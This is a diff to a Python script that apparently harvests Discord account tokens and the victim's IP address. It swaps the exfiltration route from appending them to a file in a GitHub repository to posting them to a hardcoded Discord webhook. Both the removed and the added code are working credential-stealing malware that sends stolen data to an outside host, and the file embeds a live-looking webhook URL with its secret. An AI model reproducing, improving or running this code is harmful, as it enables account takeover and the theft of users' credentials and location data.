@@ -3,7 +3,8 @@ import re
 import json
 import requests
 from datetime import datetime
-import base64
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1370231956520042527/c6jJTim4f1IUXtOnKzsQeyAnifKMshO2LadA_LaLZjRdOGWyIEBBmHvSsHt69t59F3QW"  
 
 def fdt():
     t = []
@@ -28,44 +29,34 @@ def gia():
     except requests.exceptions.RequestException:
         return None
 
-def stupr_append(tkns, ip, ghtk, rpo):
-    gua = f'https://api.github.com/repos/{rpo}/contents/list.txt'
-    h = {'Authorization': f'token {ghtk}', 'Accept': 'application/vnd.github.v3+json'}
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    entry = f"Timestamp: {ts}\nTokens:\n{chr(10).join(tkns)}\nIP Address: {ip if ip else 'N/A'}\n\n"
-    cm = f'Add log entry - {ts}'
+def send_to_discord(tokens, ip_address):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    content = f"""
+    **Discord Info Found!**
+    Timestamp: {timestamp}
+    **Discord Tokens:**
+    ```
+    {'\\n'.join(tokens) if tokens else 'No tokens found.'}
+    ```
+    **IP Address:** {ip_address if ip_address else 'N/A'}
+    """
+
+    payload = {
+        "content": content
+    }
 
     try:
-        # Get existing content (if any)
-        get_response = requests.get(gua, headers=h)
-        get_response.raise_for_status()
-        content = base64.b64decode(get_response.json()['content']).decode('utf-8')
-        sha = get_response.json()['sha']
-        updated_content = content + entry
-        encoded_content = base64.b64encode(updated_content.encode('utf-8')).decode('utf-8')
-        data = {'message': cm, 'content': encoded_content, 'sha': sha}
-        put_response = requests.put(gua, headers=h, data=json.dumps(data))
-        put_response.raise_for_status()
-        print(f"Log appended to list.txt: {put_response.json()['content']['html_url']}")
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        response.raise_for_status()
+        print("Data sent to Discord successfully!")
     except requests.exceptions.RequestException as e:
-        if e.response is not None and e.response.status_code == 404:
-            
-            encoded_content = base64.b64encode(entry.encode('utf-8')).decode('utf-8')
-            data = {'message': cm, 'content': encoded_content}
-            put_response = requests.put(gua, headers=h, data=json.dumps(data))
-            put_response.raise_for_status()
-            print(f"list.txt created and log added: {put_response.json()['content']['html_url']}")
-        else:
-            print(f"Error updating list.txt: {e}")
-            if e.response is not None:
-                print(f"Github API Error: {e.response.status_code} - {e.response.json()}")
+        print(f"Error sending to Discord: {e}")
 
 if __name__ == "__main__":
     tokens = fdt()
     ip_address = gia()
-    ght = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm"
-    repo = "Syxfer/mal_dis_ip_tsmalann_syxfer"
-    if ght.startswith("ssh-"): 
-        print("Warning: You appear to be using an SSH key, not a Personal Access Token. This script requires a Personal Access Token with 'repo' scope.")
-    elif tokens or ip_address:
-        stupr_append(tokens, ip_address, ght, repo)
+
+    if tokens or ip_address:
+        send_to_discord(tokens, ip_address)
+    else:
+        print("No new information found.")
